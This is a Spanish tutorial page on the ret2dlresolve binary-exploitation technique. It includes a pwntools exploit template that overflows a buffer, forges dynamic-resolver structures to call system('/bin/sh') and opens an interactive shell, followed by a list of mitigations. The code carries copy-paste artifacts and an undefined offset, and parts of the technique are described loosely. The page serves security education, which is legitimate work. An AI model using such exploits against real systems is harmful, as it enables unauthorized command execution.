---
icon: broom
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# ret2dlresolve

**ret2dlresolve** es una técnica de explotación utilizada en la explotación de binarios ELF de 64 bits. Permite a un atacante manipular el proceso de resolución de funciones dinámicas para ejecutar código arbitrario, como invocar la función `system()` con un argumento como `/bin/sh`, logrando así la ejecución de comandos en el sistema vulnerable.

### ¿Cómo Funciona ret2dlresolve?

Durante el proceso de ejecución de un binario, las funciones de la biblioteca compartida (como `libc`) son resueltas dinámicamente. El cargador dinámico utiliza tablas como la **Procedure Linkage Table (PLT)** y la **Global Offset Table (GOT)** para gestionar las direcciones de estas funciones. La técnica ret2dlresolve explota este proceso al manipular estas tablas para redirigir la ejecución del programa a funciones específicas de la biblioteca, como `system()`.

#### Pasos Generales del Ataque

1. **Sobrescribir Entradas de la GOT**: El atacante escribe direcciones controladas en la GOT para que, cuando se llame a una función específica, se redirija a una rutina de su elección.
2. **Preparar Estructuras Falsas**: Se crean estructuras falsas que imitan las utilizadas por el cargador dinámico para la resolución de funciones. Estas estructuras se colocan en una ubicación conocida y accesible.
3. **Invocar la Resolución de Funciones**: Se provoca una llamada a la función `_dl_runtime_resolve()`, que es responsable de resolver las direcciones de las funciones dinámicas. Al pasarle las estructuras falsas, el atacante puede hacer que resuelva la dirección de `system()` y la ejecute con un argumento como `/bin/sh`.

### Implementación de ret2dlresolve

La implementación de ret2dlresolve puede variar según el entorno y las protecciones del binario. Una herramienta útil en este proceso es **pwntools**, una biblioteca de Python que facilita la creación de exploits. Esta biblioteca proporciona funcionalidades para construir cadenas ROP (Return-Oriented Programming) y manipular estructuras ELF.

**Ejemplo Básico con pwntools**:

```python
pythonCopiarEditarfrom pwn import *

# Cargar el binario
elf = context.binary = ELF('./vulnerable_binary', checksec=False)

# Iniciar el proceso
p = elf.process()

# Crear el objeto ROP
rop = ROP(elf)

# Crear el objeto ret2dlresolve
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])

# Construir la carga útil
rop.raw('A' * offset)  # Rellenar hasta la dirección de retorno
rop.read(0, dlresolve.data_addr)  # Leer las estructuras falsas
rop.ret2dlresolve(dlresolve)  # Llamar a _dl_runtime_resolve con las estructuras

# Enviar la carga útil
p.sendline(rop.chain())
p.sendline(dlresolve.payload)

# Interactuar con la shell
p.interactive()
```

En este ejemplo, se utiliza pwntools para construir la cadena ROP que explota el desbordamiento de búfer y redirige la ejecución a `system('/bin/sh')`. La clase `Ret2dlresolvePayload` se encarga de crear las estructuras necesarias para la resolución de funciones.

[book.hacktricks.wiki](https://book.hacktricks.wiki/es/binary-exploitation/rop-return-oriented-programing/ret2dlresolve.html?utm_source=chatgpt.com)

### Consideraciones de Seguridad

La técnica ret2dlresolve puede ser mitigada mediante la implementación de diversas medidas de seguridad, como:

* **Full RELRO**: Esta protección impide la escritura en la GOT, dificultando la manipulación de las direcciones de las funciones.
* **ASLR (Address Space Layout Randomization)**: Aleatoriza las direcciones de las funciones y las estructuras de datos, dificultando la predicción de las direcciones objetivo.
* **Stack Canaries**: Detectan y previenen desbordamientos de búfer que intentan sobrescribir direcciones de retorno.
* **NX (No eXecute)**: Previene la ejecución de código en regiones de memoria no ejecutables, dificultando la ejecución de shellcodes.

Es importante destacar que, aunque estas medidas aumentan la seguridad, ninguna es completamente efectiva por sí sola. Una combinación adecuada de ellas es esencial para proteger los sistemas contra técnicas como ret2dlresolve.
